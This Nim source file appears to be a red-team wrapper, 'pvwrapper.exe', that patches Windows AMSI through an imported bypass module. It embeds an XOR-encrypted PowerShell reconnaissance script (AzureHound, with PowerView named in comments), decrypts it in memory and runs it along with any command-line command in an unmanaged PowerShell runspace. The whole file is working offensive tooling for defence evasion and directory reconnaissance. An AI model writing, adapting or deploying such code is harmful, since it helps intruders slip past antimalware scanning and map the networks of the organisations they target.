import winim/clr
import sugar
import strformat
import os
import std/enumerate
import ../defense-evasion/bypass_amsi


# decrypt the script
proc decrypt(buffer: var seq[byte], key: byte) =
  for i, b in enumerate(buffer):
    buffer[i] = b.xor(key)


proc execPowerView(command: string) =
  # reads the PowerView Script and is then able to execute
  # arbitrary commands from that powershell script
  #const fullscript = slurp("./PowerView.ps1.enc")
  const fullscript = slurp("/home/msc/documents/python/red-team-server/testing/powershell/AzureHound.ps1.enc")
  var scriptBytes = cast[seq[byte]](fullscript)

  # decrypt the script
  decrypt(scriptBytes, 0x5F)

  var decryptedScript = cast[string](scriptBytes)

  var Automation = load("System.Management.Automation")
  var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")

  var runspace = @RunspaceFactory.CreateRunspace()

  runspace.Open()

  var pipeline = runspace.CreatePipeline()

  # Load the script first and the the PowerView Command
  pipeline.Commands.AddScript(decryptedScript)
  pipeline.Commands.AddScript(command)

  try:
    var results = pipeline.Invoke()
    for i in countUp(0,results.Count()-1):
        echo results.Item(i)
  except:
    echo "[-] Failed to execute command, aborting"

  runspace.Close()

proc main() =


  var args = commandLineParams()
  if len(args) == 0:
    echo "usage: pvwrapper.exe <Command>"
    return

  # Patch AMSI
  echo "Patching AMSI..."
  discard bypassAmsi()

  echo fmt"Loading PV and Executing `{args[0]}`"
  execPowerView(args[0])


if isMainModule:
  main()
